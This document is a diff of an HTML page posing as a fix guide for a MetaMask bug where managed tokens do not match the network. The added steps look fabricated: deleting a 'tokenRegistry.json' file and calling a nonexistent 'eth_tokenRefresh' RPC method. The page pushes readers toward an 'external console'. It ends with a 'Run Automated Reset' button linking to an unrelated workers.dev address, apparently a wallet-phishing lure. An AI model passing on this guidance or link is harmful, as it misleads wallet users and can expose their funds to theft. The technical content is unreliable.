@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Manage Tokens Miss Match With Net – Fix Guide</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
+        font-family: system-ui;
         background: #0a0c10;
         color: #ddd;
         padding: 20px;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,40 +42,30 @@
 <h1>Metamask Extension Bug Assets Manage Tokens Miss Match With Net</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a mismatch between the tokens listed in the Metamask extension's "Assets" and "Manage Tokens" sections, specifically when filtered by network. The tokens displayed do not accurately reflect the expected tokens for the selected network, leading to confusion and potential errors in transactions.</li>
+<li>Users experience a mismatch between the tokens listed in the Metamask extension's "Manage Tokens" section and the network filter, resulting in incorrect or missing tokens being displayed.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension that causes it to incorrectly fetch or display token information based on the current network selection. This results in a discrepancy between the tokens shown in the "Assets" view and those available under "Manage Tokens" for a specific network.</li>
+<li>The error occurs due to a desynchronization between the Metamask extension's internal token registry and the Ethereum network's token listings, often caused by outdated extension versions, incorrect network configurations, or corrupted token data.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To troubleshoot this issue, users can attempt the following manual overrides:</li>
-<li>Refresh the Metamask extension and retry the token management process.</li>
-<li>Ensure the correct network is selected and try resetting the token list.</li>
-<li>Utilize the extension's built-in debugging tools or external tools to verify token configurations:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Reset the Metamask extension's token registry by deleting the <code>tokenRegistry.json</code> file</li>
+<li>Update the Metamask extension to the latest version and restart the browser</li>
+<li>Run the following command to manually refresh the token listings:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;network&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ethereum&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;chainId&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;tokens&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...tokenAddress&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TOKEN&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">]</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span>--data<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_tokenRefresh&quot;,&quot;params&quot;:[]}&#39;</span><span class="w"> </span>https://mainnet.infura.io/v3/YOUR_PROJECT_ID
 </code></pre></div>
 
-<p>Consider accessing a more comprehensive debugging environment for deeper inspection.</p>
+<p>Consider utilizing an external console for more advanced debugging and token management capabilities.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured.</li>
-<li>Familiarity with Ethereum network and token management.</li>
-<li>Basic understanding of JSON data structures for token configuration.</li>
+<li>Metamask extension installed and configured</li>
+<li>Ethereum network connection established</li>
+<li>Basic understanding of JSON-RPC commands and token management</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-send-nft-displays-id-as-if-it-w.html">Metamask Extension Bug Activity Send Nft Displays Id As If It Were Amount</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</a></li><li><a href="./archive/2026/06/metamask-extension-bug-activity-contract-deployments-are-displa.html">Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
